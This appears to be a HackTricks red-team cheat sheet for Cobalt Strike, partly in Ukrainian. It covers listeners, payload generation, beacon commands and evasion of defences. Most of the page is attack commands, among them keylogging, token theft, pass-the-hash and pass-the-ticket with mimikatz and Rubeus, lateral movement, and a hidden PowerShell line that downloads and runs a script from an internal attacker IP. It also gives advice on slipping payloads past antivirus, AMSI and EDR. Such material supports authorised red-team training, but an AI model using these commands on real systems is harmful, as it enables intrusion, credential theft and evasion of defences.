# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` після цього можна вибрати, де слухати, який тип beacon використовувати (http, dns, smb...) та інші параметри.

### Peer2Peer Listeners

The beacons of these listeners don't need to talk to the C2 directly, they can communicate to it through other beacons.

`Cobalt Strike -> Listeners -> Add/Edit` після цього потрібно вибрати TCP або SMB beacons

* The **TCP beacon will set a listener in the port selected**. To connect to a TCP beacon use the command `connect <ip> <port>` from another beacon
* The **smb beacon will listen in a pipename with the selected name**. To connect to a SMB beacon you need to use the command `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** для файлів HTA
* **`MS Office Macro`** для Office-документа з макросом
* **`Windows Executable`** для .exe, .dll або service .exe
* **`Windows Executable (S)`** для **stageless** .exe, .dll або service .exe (краще stageless ніж staged, менше IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Це згенерує скрипт/виконуваний файл для завантаження beacon з Cobalt Strike у форматах, таких як: bitsadmin, exe, powershell та python

#### Host Payloads

Якщо у вас вже є файл, який ви хочете розмістити на веб-сервері, просто перейдіть до `Attacks -> Web Drive-by -> Host File` та оберіть файл для хостингу і конфігурацію web-сервера.

### Beacon Options

<details>
<summary>Параметри beacon і команди</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Налаштовані імпланти / Linux Beacons

- Кастомному агенту потрібно лише говорити протокол Cobalt Strike Team Server HTTP/S (default malleable C2 profile), щоб зареєструватися/check-in і отримувати завдання. Реалізуйте ті ж URI/headers/metadata crypto, визначені в профілі, щоб повторно використовувати Cobalt Strike UI для таскінгу та виводу.
- Aggressor Script (наприклад, `CustomBeacon.cna`) може обгортати генерацію payload для не-Windows beacon, щоб оператори могли вибирати listener і робити ELF payload безпосередньо з GUI.
- Приклади Linux task handler-ів, які експонуються Team Server: `sleep`, `cd`, `pwd`, `shell` (виконання довільних команд), `ls`, `upload`, `download` та `exit`. Вони відповідають task ID, які очікує Team Server, і повинні бути реалізовані на сервері так, щоб повертати вивід у належному форматі.
- Підтримку BOF на Linux можна додати, завантаживши Beacon Object Files in-process за допомогою TrustedSec's ELFLoader (https://github.com/trustedsec/ELFLoader) (також підтримує Outflank-style BOFs), що дозволяє модульний post-exploitation запускатися в контексті/привілеях імпланта без створення нових процесів.
- Вбудуйте SOCKS handler у кастомний beacon, щоб зберегти паритет pivoting з Windows Beacons: коли оператор запускає `socks <port>`, імплант має відкрити локальний проксі для маршрутизації інструментів оператора через скомпрометований Linux-хост у внутрішні мережі.

## Opsec

### Execute-Assembly

The **`execute-assembly`** використовує **sacrificial process**, застосовуючи remote process injection для виконання вказаної програми. Це дуже шумно, оскільки для інжекції в процес використовуються певні Win APIs, за якими перевіряють майже всі EDR. Однак є кілька кастомних інструментів, які можна використати, щоб завантажити щось у той самий процес:

- https://github.com/anthemtotheego/InlineExecute-Assembly
- https://github.com/kyleavery/inject-assembly
- В Cobalt Strike також можна використовувати BOF (Beacon Object Files): https://github.com/CCob/BOF.NET

The agressor script https://github.com/outflanknl/HelpColor створить команду `helpx` у Cobalt Strike, яка додаватиме кольори в команди, вказуючи чи є вони BOFs (зелений), Frok&Run (жовтий) та подібні, або ProcessExecution, injection чи подібні (червоний). Це допомагає знати, які команди більш stealthy.

### Act as the user

Ви можете перевіряти події типу `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Перевірте всі interactive logons, щоб знати звичний графік роботи.
- System EID 12,13 - Перевірте частоту shutdown/startup/sleep.
- Security EID 4624/4625 - Перевірте вхідні валідні/невалідні NTLM спроби.
- Security EID 4648 - Ця подія створюється, коли для логону використовуються plaintext credentials. Якщо процес її згенерував, бінарний файл ймовірно має креденшіали у відкритому вигляді в конфігурації або в коді.

При використанні `jump` з Cobalt Strike краще застосовувати метод `wmi_msbuild`, щоб новий процес виглядав більш легітимно.

### Use computer accounts

Захисники часто фільтрують підозрілі поведінки від користувачів і **виключають service accounts та computer accounts типу `*$` зі свого моніторингу**. Ви можете використовувати ці облікові записи для lateral movement або privilege escalation.

### Use stageless payloads

Stageless payloads менш шумні, ніж staged, тому що їм не потрібно завантажувати second stage з C2 server. Це означає, що вони не генерують мережевий трафік після початкового з'єднання, що робить їх менш помітними для мережево-орієнтованих засобів захисту.

### Tokens & Token Store

Будьте обережні під час крадіжки або генерації токенів, оскільки EDR може перелічувати всі токени всіх потоків і знайти **token, що належить іншому користувачу** або навіть SYSTEM у процесі.

Корисно зберігати токени **за beacon** так, щоб не доводилося красти один і той самий токен знову і знову. Це зручно для lateral movement або коли потрібно повторно використовувати вкрадений токен:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- `token-store show`
- `token-store use <id>`
- `token-store remove <id>`
- `token-store remove-all`

При lateral movement зазвичай краще **вкрасти token, ніж згенерувати новий**, або виконати pass the hash атаку.

### Guardrails

Cobalt Strike має функцію **Guardrails**, яка допомагає блокувати використання певних команд або дій, що можуть бути виявлені захисниками. Guardrails можна налаштувати для блокування конкретних команд, наприклад `make_token`, `jump`, `remote-exec` та інших, які часто використовуються для lateral movement або privilege escalation.

Крім того, репозиторій https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks також містить перевірки та ідеї, які варто розглянути перед виконанням payload.

### Tickets encryption

В AD будьте обережні з шифруванням ticket-ів. За замовчуванням деякі інструменти використовують RC4 для Kerberos tickets, що менш безпечно, ніж AES, і в актуальних середовищах за замовчуванням використовують AES. Це може бути виявлено захисниками, які моніторять використання слабких алгоритмів шифрування.

### Avoid Defaults

При використанні Cobalt Strike за замовчуванням SMB pipe-и матимуть ім'я `msagent_####` і `status_####`. Змініть ці імена. Можна перевірити імена існуючих pipe-ів з Cobalt Strike командою: `ls \\.\pipe\`

Крім того, при SSH сесіях створюється pipe `\\.\pipe\postex_ssh_####`. Змініть його за допомогою `set ssh_pipename "<new_name>";`.

Також в poext exploitation attack pipe-и `\\.\pipe\postex_####` можна змінити через `set pipename "<new_name>"`.

У Cobalt Strike профілях ви також можете змінювати такі параметри:

- Уникати використання `rwx`
- Як поводиться process injection (які APIs будуть використані) у блоці `process-inject {...}`
- Як працює "fork and run" у блоці `post-ex {…}`
- Час сну (sleep time)
- Максимальний розмір бінарників для завантаження в пам'ять
- Memory footprint та вміст DLL через блок `stage {...}`
- Мережевий трафік

### Bypass memory scanning

Деякі EDR сканують пам'ять на відомі сигнатури malware. Cobalt Strike дозволяє модифікувати функцію `sleep_mask` як BOF, який зможе зашифрувати backdoor в пам'яті.

### Noisy proc injections

Інжекція коду в процес зазвичай дуже шумна, оскільки **звичайні процеси рідко це роблять і способів зробити це обмежена кількість**. Тому це може бути виявлено поведінковими системами виявлення. Також це може спрацьовувати в EDR, які сканують мережу на **threads containing code that is not in disk** (хоча процеси на кшталт браузерів з JIT роблять це часто). Приклад: https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2

### Spawnas | PID and PPID relationships

При створенні нового процесу важливо **підтримувати звичний батьківсько-дочірній** зв'язок між процесами, щоб уникнути детекції. Якщо svchost.exec запускає iexplorer.exe, це виглядатиме підозріло, оскільки svchost.exe не є батьком iexplorer.exe у нормальному Windows-середовищі.

Коли новий beacon створюється в Cobalt Strike, за замовчуванням створюється процес `rundll32.exe` для запуску нового listener. Це не дуже stealthy і легко виявляється EDR. Крім того, `rundll32.exe` запускається без аргументів, що робить його ще підозрілішим.

За допомогою наступної команди Cobalt Strike ви можете вказати інший процес для спавну нового beacon, зробивши його менш помітним:
```bash
spawnto x86 svchost.exe
```
You can also change this setting **`spawnto_x86` and `spawnto_x64`** in a profile.

### Проксування трафіку атакуючого

Іноді атакуючому потрібно запускати інструменти локально, навіть на Linux-машинах, і змусити трафік жертв доходити до цього інструмента (наприклад, NTLM relay).

Більше того, іноді для виконання pass-the.hash або pass-the-ticket атаки більш приховано для атакуючого додати цей хеш або квиток у власний локальний процес LSASS, а потім pivot-ити з нього замість модифікації процесу LSASS на машині жертви.

Однак потрібно бути **обережним з генерованим трафіком**, оскільки ви можете відправляти незвичний трафік (Kerberos?) із вашого backdoor-процесу. Для цього можна pivot-ити в процес браузера (хоча при інжекції в процес вас можуть помітити, тож продумайте stealth-спосіб зробити це).

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Зазвичай у `/opt/cobaltstrike/artifact-kit` можна знайти код і попередньо скомпільовані шаблони (у `/src-common`) payloads, які cobalt strike використовуватиме для генерації бінарних beacons.

Використовуючи [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) з згенерованим backdoor (або просто зі скомпільованим шаблоном), ви можете знайти, що саме тригерить defender. Зазвичай це рядок. Тому ви можете просто змінити код, який генерує backdoor, щоб цей рядок не з'являвся у фінальному бінарному файлі.

Після зміни коду просто запустіть `./build.sh` з тієї ж директорії і скопіюйте папку `dist-pipe/` у Windows-клієнт в `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Не забудьте завантажити агресивний скрипт `dist-pipe\artifact.cna`, щоб вказати Cobalt Strike використовувати ресурси з диска, які ми хочемо, а не ті, що вже завантажені.

#### Набір ресурсів

Папка ResourceKit містить шаблони скриптових payloads для Cobalt Strike, включаючи PowerShell, VBA та HTA.

Використовуючи [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) разом із шаблонами, ви можете виявити, що не подобається захиснику (у цьому випадку AMSI) і змінити це:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Модифікуючи виявлені рядки, можна згенерувати шаблон, який не буде виявлений.

Не забудьте завантажити агресивний скрипт `ResourceKit\resources.cna`, щоб вказати Cobalt Strike використовувати ресурси з диска, які ми хочемо, а не ті, що завантажені.

#### Function hooks | Syscall

Function hooking — дуже поширений метод EDRs для виявлення шкідливої активності. Cobalt Strike дозволяє обходити ці хуки, використовуючи **syscalls** замість стандартних викликів Windows API за допомогою конфігурації **`None`**, або використовувати версію функції `Nt*` з налаштуванням **`Direct`**, або просто перестрибувати через функцію `Nt*` з опцією **`Indirect`** у malleable profile. Залежно від системи, один варіант може бути більш стелсним, ніж інший.

Це можна встановити в профілі або, використовуючи команду **`syscall-method``**

Однак це також може спричиняти багато шуму.

Одна з опцій, яку надає Cobalt Strike для обходу function hooks — видалити ці хуки за допомогою: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Також ви можете перевірити, які функції hooked, за допомогою [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) або [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Різні команди Cobalt Strike</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Посилання

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42 analysis of Cobalt Strike metadata encryption](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC diary on Cobalt Strike traffic](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
